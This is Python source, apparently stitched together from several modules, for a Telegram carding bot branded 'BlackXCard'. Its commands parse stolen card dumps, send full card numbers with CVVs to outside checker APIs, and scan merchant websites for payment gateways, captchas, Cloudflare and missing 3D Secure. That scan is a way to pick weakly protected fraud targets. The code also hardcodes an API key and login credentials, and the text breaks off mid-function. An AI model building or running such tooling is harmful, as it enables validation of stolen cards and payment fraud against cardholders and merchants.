            "❌ Please provide or reply to a dump containing cards\\. Usage: `/fl <dump or reply>`",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Deduct credit
    if not await consume_credit(user_id):
        return await update.effective_message.reply_text(
            "❌ You have no credits left\\. Please get a subscription to use this command\\.",
            parse_mode=ParseMode.MARKDOWN_V2
        )

    # Regex to find cards: number|mm|yy|cvv (cvv 3 or 4 digits, year 2 or 4 digits)
    card_pattern = re.compile(
        r"\b(\d{13,16})\|(\d{1,2})\|(\d{2}|\d{4})\|(\d{3,4})\b"
    )
    cards_found = ["{}|{}|{}|{}".format(m[0], m[1].zfill(2), m[2][-2:], m[3]) for m in card_pattern.findall(dump)]
    count = len(cards_found)

    if cards_found:
        # Each card in monospace with proper escaping
        extracted_cards_text = "\n".join([f"`{escape_markdown_v2(card)}`" for card in cards_found])
    else:
        extracted_cards_text = "_No cards found in the provided text\\._"

    msg = (
        f"╭━ [ 💳 𝗘𝘅𝘁𝗿𝗮𝗰𝘁𝗲𝗱 𝗖𝗮𝗿𝗱𝘀 ] \n"
        f"┣ ❏ Total ➳ {count}\n"
        f"╰━━━━━━━\n\n"
        f"{extracted_cards_text}"
    )

    await update.effective_message.reply_text(msg, parse_mode=ParseMode.MARKDOWN_V2)






# --- Imports ---
import aiohttp
import asyncio
import logging
import time
import html
import re
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from bin import get_bin_info
from db import get_user, update_user  # assuming you have these functions

logger = logging.getLogger(__name__)

# --- Constants ---
BULLET_GROUP_LINK = "tg://resolve?domain=BlinkCarder"
bullet_text = "⩙"
bullet_link = f'<a href="{BULLET_GROUP_LINK}">{bullet_text}</a>'

DEVELOPER_NAME = "𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™"
DEVELOPER_LINK = "tg://resolve?domain=BlinkCarder"
developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"

# --- Credit System ---
async def consume_credit(user_id: int) -> bool:
    try:
        user_data = await get_user(user_id)
        if user_data and user_data.get("credits", 0) > 0:
            await update_user(user_id, credits=user_data["credits"] - 1)
            return True
    except Exception as e:
        logger.warning(f"[consume_credit] Error updating user {user_id}: {e}")
    return False

# --- Shared Regex ---
# --- Shared Regex ---
# Supports: | / : space as separators
FLEX_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

# --- /vbv Command ---
async def vbv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    # --- Credit check ---
    if not await consume_credit(user_id):
        await update.message.reply_text("❌ You don’t have enough credits to use /vbv.")
        return

    # --- Card data extraction ---
    card_data = None

    raw_text = ""
    if context.args:
        raw_text = " ".join(context.args).strip()
    elif update.message.reply_to_message and update.message.reply_to_message.text:
        raw_text = update.message.reply_to_message.text.strip()

    if raw_text:
        match = FLEX_CARD_REGEX.search(raw_text)
        if match:
            cc, mm, yy, cvv = match.groups()
            mm = mm.zfill(2)                   # 06 not 6
            yy = yy[-2:] if len(yy) == 4 else yy  # 2027 → 27
            card_data = f"{cc}|{mm}|{yy}|{cvv}"

    if not card_data:
        await update.message.reply_text(
            "⚠️ Usage:\n"
            "<code>/vbv 4111111111111111|07|2027|123</code>\n"
            "Or reply to a message containing a card.\n\n",
            parse_mode=ParseMode.HTML
        )
        return

    # --- Processing message ---
    processing_text = (
        f"<pre><code>𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳</code></pre>\n"
        f"<pre><code>𝗩𝗕𝗩 𝗖𝗵𝗲𝗰𝗸 𝗢𝗻𝗴𝗼𝗶𝗻𝗴</code></pre>\n"
        f"𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➵ 𝟯𝐃 𝗦𝗲𝗰𝘂𝗿𝗲 / 𝗩𝗕𝗩 𝗟𝗼𝗼𝗸𝘂𝗽\n"
    )

    msg = await update.message.reply_text(
        processing_text, parse_mode=ParseMode.HTML, disable_web_page_preview=True
    )

    # --- Run async VBV check ---
    asyncio.create_task(run_vbv_check(msg, update, card_data))




# --- Background worker ---
async def run_vbv_check(msg, update, card_data: str):
    """
    Check 3D Secure / VBV status for a card and display BIN info.
    """
    import time
    start_time = time.time()
    try:
        cc, mes, ano, cvv = card_data.split("|")
    except ValueError:
        await msg.edit_text("❌ Invalid format. Use: /vbv 4111111111111111|07|2027|123")
        return

    bin_number = cc[:6]
    api_url = f"https://rocky-rir7.onrender.com/gateway=bin?key=rockysoon&card={card_data}"

    # --- Fetch VBV data ---
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=50) as resp:
                if resp.status != 200:
                    await msg.edit_text(f"❌ API Error (Status {resp.status}). Try again later.")
                    return
                vbv_data = await resp.json(content_type=None)
    except asyncio.TimeoutError:
        await msg.edit_text("❌ API request failed: Timed out ⏳")
        return
    except aiohttp.ClientConnectorError:
        await msg.edit_text("❌ API request failed: Cannot connect 🌐")
        return
    except aiohttp.ContentTypeError:
        await msg.edit_text("❌ API request failed: Invalid JSON 📄")
        return
    except Exception as e:
        await msg.edit_text(f"❌ API request failed: {type(e).__name__} → {e}")
        return

    # --- BIN lookup ---
    try:
        bin_details = await get_bin_info(bin_number)
        brand = (bin_details.get("scheme") or "N/A").title()
        issuer = bin_details.get("bank") or "N/A"
        country_name = bin_details.get("country") or "Unknown"
        country_flag = bin_details.get("country_emoji", "")
    except Exception:
        brand = issuer = "N/A"
        country_name = "Unknown"
        country_flag = ""

    # --- Prepare response ---
    response_text = vbv_data.get("response", "N/A")
    check_mark = "✅" if "successful" in response_text.lower() else "❌"

    # --- Developer info ---
    DEVELOPER_NAME = "𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™"
    DEVELOPER_LINK = "tg://resolve?domain=BlinkCarder"
    developer_clickable = f"<a href='{DEVELOPER_LINK}'>{DEVELOPER_NAME}</a>"

    elapsed_time = round(time.time() - start_time, 2)
    escaped_card = html.escape(card_data)

    # --- Final formatted message ---
    final_text = (
        f"<b><i>3D Secure / VBV Lookup</i></b>\n\n"
        f"𝐂𝐚𝐫𝐝 ➵ <code>{escaped_card}</code>\n"
        f"𝐁𝐈𝐍 ➵ <code>{bin_number}</code>\n"
        f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➵ <i><code>{html.escape(response_text)} {check_mark}</code></i>\n\n"
        f"<pre>"
        f"𝐁𝐫𝐚𝐧𝐝 ➵ {html.escape(brand)}\n"
        f"𝐁𝐚𝐧𝐤 ➵ {html.escape(issuer)}\n"
        f"𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➵ {html.escape(country_name)} {country_flag}"
        f"</pre>\n\n"
        f"𝐃𝐞𝐯 ➵ {developer_clickable}\n"
        f"𝐄𝐥𝐚𝐩𝐬𝐞𝐝 ➵ {elapsed_time}s"
    )

    await msg.edit_text(final_text, parse_mode="HTML", disable_web_page_preview=True)



import time
import logging
import aiohttp
import asyncio
import html
from html import escape
from telegram import Update
from telegram.constants import ParseMode
from telegram.ext import ContextTypes
from db import get_user, update_user  # credit system
import re

logger = logging.getLogger(__name__)
logging.basicConfig(level=logging.INFO)

# Try to import your BIN lookup helper; provide a safe fallback if absent
try:
    from bin import get_bin_info
except Exception:
    async def get_bin_info(bin_number: str) -> dict:
        return {"scheme": None, "bank": None, "country": None, "country_emoji": ""}


# --- Cooldown and API config ---
BASE_COOLDOWN = 5
COOLDOWN_SECONDS = BASE_COOLDOWN

# --- New API (autoxmaster) config ---
API_URL = "https://autoxmaster.onrender.com/lbt"
API_KEY = "Xcracker911"
API_USER = "rocky"
API_PASS = "Rocky@10010"
SITE = "https://disciplinedfinancialmanagement.com"
API_TIMEOUT_SECONDS = 50


# --- Credit System ---
async def consume_credit(user_id: int) -> bool:
    try:
        user_data = await get_user(user_id)
        if user_data and user_data.get("credits", 0) > 0:
            await update_user(user_id, credits=user_data["credits"] - 1)
            return True
    except Exception as e:
        logger.warning(f"[consume_credit] Error updating user {user_id}: {e}")
    return False


# --- Regex for multiple card formats ---
FLEX_CARD_REGEX = re.compile(
    r"\b(\d{12,19})[\|/: ]+(\d{1,2})[\|/: ]+(\d{2,4})[\|/: ]+(\d{3,4})\b"
)

def normalize_card(text: str | None) -> str | None:
    if not text:
        return None
    match = FLEX_CARD_REGEX.search(text)
    if not match:
        return None
    cc, mm, yy, cvv = match.groups()
    mm = mm.zfill(2)
    yy = yy[-2:] if len(yy) == 4 else yy
    return f"{cc}|{mm}|{yy}|{cvv}"


# --- Cooldown tracker ---
user_last_command_time: dict[int, float] = {}



import re
import aiohttp
import asyncio
from bs4 import BeautifulSoup
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler

# CMS patterns
CMS_PATTERNS = {
    'Shopify': r'cdn\.shopify\.com|shopify\.js',
    'BigCommerce': r'cdn\.bigcommerce\.com|bigcommerce\.com',
    'Wix': r'static\.parastorage\.com|wix\.com',
    'Squarespace': r'static1\.squarespace\.com|squarespace-cdn\.com',
    'WooCommerce': r'wp-content/plugins/woocommerce/',
    'Magento': r'static/version\d+/frontend/|magento/',
    'PrestaShop': r'prestashop\.js|prestashop/',
    'OpenCart': r'catalog/view/theme|opencart/',
    'Shopify Plus': r'shopify-plus|cdn\.shopifycdn\.net/',
    'Salesforce Commerce Cloud': r'demandware\.edgesuite\.net/',
    'WordPress': r'wp-content|wp-includes/',
    'Joomla': r'media/jui|joomla\.js|media/system/js|joomla\.javascript/',
    'Drupal': r'sites/all/modules|drupal\.js/|sites/default/files|drupal\.settings\.js/',
    'TYPO3': r'typo3temp|typo3/',
    'Concrete5': r'concrete/js|concrete5/',
    'Umbraco': r'umbraco/|umbraco\.config/',
    'Sitecore': r'sitecore/content|sitecore\.js/',
    'Kentico': r'cms/getresource\.ashx|kentico\.js/',
    'Episerver': r'episerver/|episerver\.js/',
    'Custom CMS': r'(?:<meta name="generator" content="([^"]+)")'
}

# Security patterns
SECURITY_PATTERNS = {
    '3D Secure': r'3d_secure|threed_secure|secure_redirect',
}

# Payment gateways list
PAYMENT_GATEWAYS = [
    "PayPal", "Stripe", "Braintree", "Square", "Cybersource", "lemon-squeezy",
    "Authorize.Net", "2Checkout", "Adyen", "Worldpay", "SagePay",
    "Checkout.com", "Bolt", "Eway", "PayFlow", "Payeezy",
    "Paddle", "Mollie", "Viva Wallet", "Rocketgateway", "Rocketgate",
    "Rocket", "Auth.net", "Authnet", "rocketgate.com", "Recurly",
    "Shopify", "WooCommerce", "BigCommerce", "Magento", "Magento Payments",
    "OpenCart", "PrestaShop", "3DCart", "Ecwid", "Shift4Shop",
    "Shopware", "VirtueMart", "CS-Cart", "X-Cart", "LemonStand",
    "Convergepay", "PaySimple", "oceanpayments", "eProcessing",
    "hipay", "cybersourse", "payjunction", "usaepay", "creo",
    "SquareUp", "ebizcharge", "cpay", "Moneris", "cardknox",
    "matt sorra", "Chargify", "Paytrace", "hostedpayments", "securepay",
    "blackbaud", "LawPay", "clover", "cardconnect", "bluepay",
    "fluidpay", "Ebiz", "chasepaymentech", "Auruspay", "sagepayments",
    "paycomet", "geomerchant", "realexpayments", "Razorpay",
    "Apple Pay", "Google Pay", "Samsung Pay", "Cash App",
    "Revolut", "Zelle", "Alipay", "WeChat Pay", "PayPay", "Line Pay",
    "Skrill", "Neteller", "WebMoney", "Payoneer", "Paysafe",
    "Payeer", "GrabPay", "PayMaya", "MoMo", "TrueMoney",
    "Touch n Go", "GoPay", "JKOPay", "EasyPaisa",
    "Paytm", "UPI", "PayU", "PayUBiz", "PayUMoney", "CCAvenue",
    "Mercado Pago", "PagSeguro", "Yandex.Checkout", "PayFort", "MyFatoorah",
    "Kushki", "RuPay", "BharatPe", "Midtrans", "MOLPay",
    "iPay88", "KakaoPay", "Toss Payments", "NaverPay",
    "Bizum", "Culqi", "Pagar.me", "Rapyd", "PayKun", "Instamojo",
    "PhonePe", "BharatQR", "Freecharge", "Mobikwik", "BillDesk",
    "Citrus Pay", "RazorpayX", "Cashfree",
    "Klarna", "Affirm", "Afterpay",
    "Splitit", "Perpay", "Quadpay", "Laybuy", "Openpay",
    "Cashalo", "Hoolah", "Pine Labs", "ChargeAfter",
    "BitPay", "Coinbase Commerce", "CoinGate", "CoinPayments", "Crypto.com Pay",
    "BTCPay Server", "NOWPayments", "OpenNode", "Utrust", "MoonPay",
    "Binance Pay", "CoinsPaid", "BitGo", "Flexa",
    "ACI Worldwide", "Bank of America Merchant Services",
    "JP Morgan Payment Services", "Wells Fargo Payment Solutions",
    "Deutsche Bank Payments", "Barclaycard", "American Express Payment Gateway",
    "Discover Network", "UnionPay", "JCB Payment Gateway",
]

from urllib.parse import urlparse
import re
import aiohttp
import asyncio
from telegram import Update
from telegram.ext import ContextTypes
from telegram.helpers import escape_markdown
from db import get_user, update_user

BULLET_GROUP_LINK = "tg://resolve?domain=BlinkCarder"

# --- Shared aiohttp session ---
session: aiohttp.ClientSession = None

async def init_session():
    global session
    if session is None or session.closed:
        session = aiohttp.ClientSession()

async def close_session():
    global session
    if session and not session.closed:
        await session.close()

# --- Credit consumption ---
async def consume_credit(user_id: int) -> bool:
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) > 0:
        await update_user(user_id, credits=user_data["credits"] - 1)
        return True
    return False

# --- Fetch site ---
async def fetch_site(url: str):
    await init_session()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    domain = urlparse(url).netloc

    headers = {
        "authority": domain,
        "scheme": "https",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/140.0.0.0 Mobile Safari/537.36",
    }

    try:
        async with session.get(url, headers=headers, timeout=15) as resp:
            text = await resp.text()
            return resp.status, text, resp.headers
    except Exception:
        return None, None, None

# --- Detection functions ---
def detect_cms(html: str):
    for cms, pattern in CMS_PATTERNS.items():
        match = re.search(pattern, html, re.IGNORECASE)
        if match:
            if cms == 'Custom CMS':
                return match.group(1) or "Custom CMS"
            return cms
    return "Unknown"

def detect_security(html: str):
    patterns_3ds = [
        r'3d\s*secure',
        r'verified\s*by\s*visa',
        r'mastercard\s*securecode',
        r'american\s*express\s*safekey',
        r'3ds',
        r'3ds2',
        r'acsurl',
        r'pareq',
        r'three-domain-secure',
        r'secure_redirect',
    ]
    for pattern in patterns_3ds:
        if re.search(pattern, html, re.IGNORECASE):
            return "3D Secure Detected ✅"
    return "2D (No 3D Secure Found ❌)"

def detect_gateways(html: str):
    detected = []
    for gateway in PAYMENT_GATEWAYS:
        # Use word boundaries to avoid partial matches (e.g., "PayU" in "PayUmoney")
        pattern = r'\b' + re.escape(gateway) + r'\b'
        if re.search(pattern, html, re.IGNORECASE):
            detected.append(gateway)
    return ", ".join(detected) if detected else "None Detected"

def detect_captcha(html: str):
    html_lower = html.lower()
    if "hcaptcha" in html_lower:
        return "hCaptcha Detected ✅"
    elif "recaptcha" in html_lower or "g-recaptcha" in html_lower:
        return "reCAPTCHA Detected ✅"
    elif "captcha" in html_lower:
        return "Generic Captcha Detected ✅"
    return "No Captcha Detected"

def detect_cloudflare(html: str, headers=None, status=None):
    if headers is None:
        headers = {}
    lower_keys = [k.lower() for k in headers.keys()]
    server = headers.get('Server', '').lower()
    # Check for Cloudflare presence (CDN or protection)
    cloudflare_indicators = [
        r'cloudflare',
        r'cf-ray',
        r'cf-cache-status',
        r'cf-browser-verification',
        r'__cfduid',
        r'cf_chl_',
        r'checking your browser',
        r'enable javascript and cookies',
        r'ray id',
        r'ddos protection by cloudflare',
    ]
    # Check headers for Cloudflare signatures
    if 'cf-ray' in lower_keys or 'cloudflare' in server or 'cf-cache-status' in lower_keys:
        # Parse HTML to check for verification/challenge page
        soup = BeautifulSoup(html, 'html.parser')
        title = soup.title.string.strip().lower() if soup.title else ''
        challenge_indicators = [
            "just a moment",
            "attention required",
            "checking your browser",
            "enable javascript and cookies to continue",
            "ddos protection by cloudflare",
            "please wait while we verify",
        ]
        # Check for challenge page indicators
        if any(indicator in title for indicator in challenge_indicators):
            return "Cloudflare Verification Detected ✅"
        if any(re.search(pattern, html, re.IGNORECASE) for pattern in cloudflare_indicators):
            return "Cloudflare Verification Detected ✅"
        if status in (403, 503) and 'cloudflare' in html.lower():
            return "Cloudflare Verification Detected ✅"
        return "Cloudflare Present (No Verification) 🔍"
    return "None"

def detect_graphql(html: str):
    if re.search(r'/graphql|graphqlendpoint|apollo-client|query\s*\{|mutation\s*\{', html, re.IGNORECASE):
        return "GraphQL Detected ✅"
    return "No GraphQL Detected ❌"

# --- Worker for background scanning ---
async def gate_worker(update: Update, url: str, msg, user_id: int):
    if not await consume_credit(user_id):
        await msg.edit_text(
            escape_markdown("❌ You don't have enough credits to perform this scan.", version=2),
            parse_mode="MarkdownV2",
            disable_web_page_preview=True
        )
        return

    # Small delay for realism & yielding
    await asyncio.sleep(0)

    status, html, headers = await fetch_site(url)
    await asyncio.sleep(0)  # Yield after fetch

    if not html:
        await msg.edit_text(
            escape_markdown(f"❌ Cannot access {url}", version=2),
            parse_mode="MarkdownV2",
            disable_web_page_preview=True
        )
        return

    cms = detect_cms(html)
    await asyncio.sleep(0)
    security = detect_security(html)
    await asyncio.sleep(0)
    gateways = detect_gateways(html)
    await asyncio.sleep(0)
    captcha = detect_captcha(html)
    await asyncio.sleep(0)
    cloudflare = detect_cloudflare(html, headers=headers, status=status)
    await asyncio.sleep(0)
    graphql = detect_graphql(html)
    await asyncio.sleep(0)

    user = update.effective_user
    requester_clickable = f"[{escape_markdown(user.first_name, version=2)}](tg://user?id={user.id})"
    developer_clickable = "[𝘽𝙡𝙖𝙘𝙠𝙓𝘾𝙖𝙧𝙙 ⸙ ™](tg://resolve?domain=BlinkCarder)"
    bullet = "⩙"
    bullet_link = f"[{escape_markdown(bullet, version=2)}]({BULLET_GROUP_LINK})"

    results = (
        f"◇━━〔 𝑳𝒐𝒐𝒌𝒖𝒑 𝑹𝒆𝒔𝒖𝒍𝒕𝒔 〕━━◇\n"
        f"{bullet_link} 𝐒𝐢𝐭𝐞 ➵ `{escape_markdown(url, version=2)}`\n"
        f"{bullet_link} 𝐆𝐚𝐭𝐞𝐰𝐚𝐲𝐬 ➵ _{escape_markdown(gateways, version=2)}_\n"
        f"{bullet_link} 𝐂𝐌𝐒 ➵ `{escape_markdown(cms, version=2)}`\n"
        f"――――――――――――――――\n"
        f"{bullet_link} 𝐂𝐚𝐩𝐭𝐜𝐡𝐚 ➵ `{escape_markdown(captcha, version=2)}`\n"
        f"{bullet_link} 𝐂𝐥𝐨𝐮𝐝𝐟𝐥𝐚𝐫𝐞 ➵ `{escape_markdown(cloudflare, version=2)}`\n"
        f"{bullet_link} 𝐒𝐞𝐜𝐮𝐫𝐢𝐭𝐲 ➵ `{escape_markdown(security, version=2)}`\n"
        f"{bullet_link} 𝐆𝐫𝐚𝐩𝐡𝐐𝐋 ➵ `{escape_markdown(graphql, version=2)}`\n"
        f"――――――――――――――――\n"
        f"{bullet_link} 𝐑𝐞𝐪𝐮𝐞𝐬𝐭 𝐁𝐲 ➵ {requester_clickable}\n"
        f"{bullet_link} 𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫 ➵ {developer_clickable}"
    )

    await msg.edit_text(results, parse_mode="MarkdownV2", disable_web_page_preview=True)

# --- /gate command ---
async def gate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /gate <site_url>")
        return

    url = context.args[0]
    user_id = update.effective_user.id

    # Processing message
    status_text = escape_markdown("𝗦𝘁𝗮𝘁𝘂𝘀 ➵ 𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 🔎...", version=2)
    bullet = "⩙"
    bullet_link = f"[{escape_markdown(bullet, version=2)}]({BULLET_GROUP_LINK})"
    processing_text = f"```𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴⏳```\n{bullet_link} {status_text}\n"

    msg = await update.message.reply_text(
        processing_text,
        parse_mode="MarkdownV2",
        disable_web_page_preview=True
    )

    # Launch worker in background (non-blocking)
    asyncio.create_task(gate_worker(update, url, msg, user_id))


import re
import aiohttp
import asyncio
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler
from telegram.helpers import escape_markdown
from urllib.parse import urlparse
from bs4 import BeautifulSoup

# CMS patterns
CMS_PATTERNS = {
    'Shopify': r'cdn\.shopify\.com|shopify\.js',
    'BigCommerce': r'cdn\.bigcommerce\.com|bigcommerce\.com',
    'Wix': r'static\.parastorage\.com|wix\.com',
    'Squarespace': r'static1\.squarespace\.com|squarespace-cdn\.com',
    'WooCommerce': r'wp-content/plugins/woocommerce/',
    'Magento': r'static/version\d+/frontend/|magento/',
    'PrestaShop': r'prestashop\.js|prestashop/',
    'OpenCart': r'catalog/view/theme|opencart/',
    'Shopify Plus': r'shopify-plus|cdn\.shopifycdn\.net/',
    'Salesforce Commerce Cloud': r'demandware\.edgesuite\.net/',
    'WordPress': r'wp-content|wp-includes/',
    'Joomla': r'media/jui|joomla\.js|media/system/js|joomla\.javascript/',
    'Drupal': r'sites/all/modules|drupal\.js/|sites/default/files|drupal\.settings\.js/',
    'TYPO3': r'typo3temp|typo3/',
    'Concrete5': r'concrete/js|concrete5/',
    'Umbraco': r'umbraco/|umbraco\.config/',
    'Sitecore': r'sitecore/content|sitecore\.js/',
    'Kentico': r'cms/getresource\.ashx|kentico\.js/',
    'Episerver': r'episerver/|episerver\.js/',
    'Custom CMS': r'(?:<meta name="generator" content="([^"]+)")'
}

# Security patterns
SECURITY_PATTERNS = {
    '3D Secure': r'3d_secure|threed_secure|secure_redirect',
}

# Payment gateways list
PAYMENT_GATEWAYS = [
    "PayPal", "Stripe", "Braintree", "Square", "Cybersource", "lemon-squeezy",
    "Authorize.Net", "2Checkout", "Adyen", "Worldpay", "SagePay",
    "Checkout.com", "Bolt", "Eway", "PayFlow", "Payeezy",
    "Paddle", "Mollie", "Viva Wallet", "Rocketgateway", "Rocketgate",
    "Rocket", "Auth.net", "Authnet", "rocketgate.com", "Recurly",
    "Shopify", "WooCommerce", "BigCommerce", "Magento", "Magento Payments",
    "OpenCart", "PrestaShop", "3DCart", "Ecwid", "Shift4Shop",
    "Shopware", "VirtueMart", "CS-Cart", "X-Cart", "LemonStand",
    "Convergepay", "PaySimple", "oceanpayments", "eProcessing",
    "hipay", "cybersourse", "payjunction", "usaepay", "creo",
    "SquareUp", "ebizcharge", "cpay", "Moneris", "cardknox",
    "matt sorra", "Chargify", "Paytrace", "hostedpayments", "securepay",
    "blackbaud", "LawPay", "clover", "cardconnect", "bluepay",
    "fluidpay", "Ebiz", "chasepaymentech", "Auruspay", "sagepayments",
    "paycomet", "geomerchant", "realexpayments", "Razorpay",
    "Apple Pay", "Google Pay", "Samsung Pay", "Cash App",
    "Revolut", "Zelle", "Alipay", "WeChat Pay", "PayPay", "Line Pay",
    "Skrill", "Neteller", "WebMoney", "Payoneer", "Paysafe",
    "Payeer", "GrabPay", "PayMaya", "MoMo", "TrueMoney",
    "Touch n Go", "GoPay", "JKOPay", "EasyPaisa",
    "Paytm", "UPI", "PayU", "PayUBiz", "PayUMoney", "CCAvenue",
    "Mercado Pago", "PagSeguro", "Yandex.Checkout", "PayFort", "MyFatoorah",
    "Kushki", "RuPay", "BharatPe", "Midtrans", "MOLPay",
    "iPay88", "KakaoPay", "Toss Payments", "NaverPay",
    "Bizum", "Culqi", "Pagar.me", "Rapyd", "PayKun", "Instamojo",
    "PhonePe", "BharatQR", "Freecharge", "Mobikwik", "BillDesk",
    "Citrus Pay", "RazorpayX", "Cashfree",
    "Klarna", "Affirm", "Afterpay",
    "Splitit", "Perpay", "Quadpay", "Laybuy", "Openpay",
    "Cashalo", "Hoolah", "Pine Labs", "ChargeAfter",
    "BitPay", "Coinbase Commerce", "CoinGate", "CoinPayments", "Crypto.com Pay",
    "BTCPay Server", "NOWPayments", "OpenNode", "Utrust", "MoonPay",
    "Binance Pay", "CoinsPaid", "BitGo", "Flexa",
    "ACI Worldwide", "Bank of America Merchant Services",
    "JP Morgan Payment Services", "Wells Fargo Payment Solutions",
    "Deutsche Bank Payments", "Barclaycard", "American Express Payment Gateway",
    "Discover Network", "UnionPay", "JCB Payment Gateway",
]

# Assuming db.py provides get_user and update_user
from db import get_user, update_user

BULLET_GROUP_LINK = "https://t.me/+EwCcMzxhQ6Y3MTQ0"

# --- Shared aiohttp session ---
session: aiohttp.ClientSession = None

async def init_session():
    global session
    if session is None or session.closed:
        session = aiohttp.ClientSession()

async def close_session():
    global session
    if session and not session.closed:
        await session.close()

# --- Credit consumption ---
async def consume_credits(user_id: int, required_credits: int) -> bool:
    user_data = await get_user(user_id)
    if user_data and user_data.get("credits", 0) >= required_credits:
        await update_user(user_id, credits=user_data["credits"] - required_credits)
        return True
    return False

# --- Fetch site ---
async def fetch_site(url: str):
    await init_session()
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    domain = urlparse(url).netloc

    headers = {
        "authority": domain,
        "scheme": "https",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "sec-ch-ua": '"Chromium";v="140", "Not=A?Brand";v="24", "Google Chrome";v="140"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "none",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) "
                      "AppleWebKit/537.36 (KHTML, like Gecko) "
                      "Chrome/140.0.0.0 Mobile Safari/537.36",
    }

    try:
        async with session.get(url, headers=headers, timeout=15) as resp:
            text = await resp.text()
            return resp.status, text, resp.headers
    except Exception:
        return None, None, None

# --- Detection functions ---
def detect_cms(html: str):
    for cms, pattern in CMS_PATTERNS.items():
        match = re.search(pattern, html, re.IGNORECASE)
        if match:
            if cms == 'Custom CMS':
                return match.group(1) or "Custom CMS"
            return cms
    return "Unknown"

def detect_security(html: str):
    patterns_3ds = [
        r'3d\s*secure',
        r'verified\s*by\s*visa',
        r'mastercard\s*securecode',
        r'american\s*express\s*safekey',
        r'3ds',
        r'3ds2',
        r'acsurl',
        r'pareq',
        r'three-domain-secure',
        r'secure_redirect',
    ]
    for pattern in patterns_3ds:
        if re.search(pattern, html, re.IGNORECASE):
            return "3D Secure Detected ✅"
    return "2D (No 3D Secure Found ❌)"

def detect_gateways(html: str):
    detected = []
    for gateway in PAYMENT_GATEWAYS:
        pattern = r'\b' + re.escape(gateway) + r'\b'
        if re.search(pattern, html, re.IGNORECASE):
            detected.append(gateway)
    return ", ".join(detected) if detected else "None Detected"

def detect_captcha(html: str):
    html_lower = html.lower()
    if "hcaptcha" in html_lower:
        return "hCaptcha Detected ✅"
    elif "recaptcha" in html_lower or "g-recaptcha" in html_lower:
        return "reCAPTCHA Detected ✅"
    elif "captcha" in html_lower:
        return "Generic Captcha Detected ✅"
    return "No Captcha Detected"

def detect_cloudflare(html: str, headers=None, status=None):
    if headers is None:
        headers = {}
    lower_keys = [k.lower() for k in headers.keys()]
    server = headers.get('Server', '').lower()
    cloudflare_indicators = [
        r'cloudflare',
        r'cf-ray',
        r'cf-cache-status',
        r'cf-browser-verification',
        r'__cfduid',
        r'cf_chl_',
        r'checking your browser',
        r'enable javascript and cookies',
        r'ray id',
        r'ddos protection by cloudflare',
    ]
    if 'cf-ray' in lower_keys or 'cloudflare' in server or 'cf-cache-status' in lower_keys:
        soup = BeautifulSoup(html, 'html.parser')
        title = soup.title.string.strip().lower() if soup.title else ''
        challenge_indicators = [
            "just a moment",
            "attention required",
            "checking your browser",
            "enable javascript and cookies to continue",
            "ddos protection by cloudflare",
            "please wait while we verify",
        ]
        if any(indicator in title for indicator in challenge_indicators):
            return "Cloudflare Verification Detected ✅"
        if any(re.search(pattern, html, re.IGNORECASE) for pattern in cloudflare_indicators):
            return "Cloudflare Verification Detected ✅"
        if status in (403, 503) and 'cloudflare' in html.lower():
            return "Cloudflare Verification Detected ✅"
        return "Cloudflare Present (No Verification) 🔍"
    return "None"

def detect_graphql(html: str):
    if re.search(r'/graphql|graphqlendpoint|apollo-client|query\s*\{|mutation\s*\{', html, re.IGNORECASE):
        return "GraphQL Detected ✅"
    return "No GraphQL Detected ❌"

async def mgate_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: /mgate {sites}")
        return

    user_id = update.effective_user.id
    urls = context.args[:5]  # Limit to 5 URLs
    required_credits = len(urls)

    # Check if user has enough credits
    user_data = await get_user(user_id)
    if not user_data or user_data.get("credits", 0) < required_credits:
        await update.message.reply_text(
            escape_markdown(f"❌ You need {required_credits} credits to scan {required_credits} site(s).", version=2),
            parse_mode="MarkdownV2",
            disable_web_page_preview=True
        )
        return

    # Processing message
